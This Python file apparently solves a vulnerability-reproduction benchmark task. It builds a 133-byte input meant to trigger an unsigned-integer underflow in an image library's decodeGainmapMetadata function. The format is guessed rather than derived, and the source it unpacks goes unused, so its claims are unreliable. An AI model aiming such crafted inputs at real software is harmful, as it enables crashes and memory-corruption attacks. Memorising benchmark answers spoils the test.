import os
import tempfile
import subprocess
import struct
import random
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            # Determine compression type and extract
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                import tarfile
                with tarfile.open(src_path, 'r:gz') as tar:
                    tar.extractall(tmpdir)
            elif src_path.endswith('.tar'):
                import tarfile
                with tarfile.open(src_path, 'r') as tar:
                    tar.extractall(tmpdir)
            else:
                # Try to extract anyway
                import tarfile
                try:
                    with tarfile.open(src_path, 'r:*') as tar:
                        tar.extractall(tmpdir)
                except:
                    raise ValueError("Could not extract source tarball")
            
            # Find the vulnerable code to understand format
            source_files = []
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                        source_files.append(os.path.join(root, file))
            
            # Analyze the decodeGainmapMetadata function
            # Based on typical gain map metadata format and the vulnerability description:
            # The issue is with unsigned subtraction wrap-around, likely when calculating
            # sizes or offsets. We need to craft data that causes this.
            
            # Typical structure for gain map metadata might include:
            # - Version/header
            # - Dimensions/sizes
            # - Offsets
            # - Data
            
            # Create a PoC that causes unsigned underflow
            # Format inspired by common image metadata structures
            
            # Build a 133-byte PoC (ground truth length)
            poc = bytearray(133)
            
            # Common pattern: two size values where second > first causes underflow
            # when computing: size = first - second (both unsigned)
            
            # Set first 4 bytes as a small value (e.g., 1)
            poc[0:4] = struct.pack('<I', 1)  # Little endian 1
            
            # Set next 4 bytes as a larger value that causes underflow
            # When subtracted: 1 - 0xFFFFFFFF = 2 (wraparound to large positive)
            poc[4:8] = struct.pack('<I', 0xFFFFFFFF)  # Max unsigned 32-bit
            
            # Fill rest with valid but minimal data to reach vulnerable code
            # Set version/magic if needed (common in headers)
            if len(poc) >= 16:
                # Add some valid header bytes
                poc[8:12] = b'\x00\x00\x00\x01'  # Version 1 maybe
                poc[12:16] = b'\x00\x00\x00\x00'  # Reserved
            
            # Ensure we have exactly 133 bytes
            # Fill remaining with pattern that might pass basic validation
            for i in range(16, len(poc)):
                poc[i] = i % 256
            
            return bytes(poc)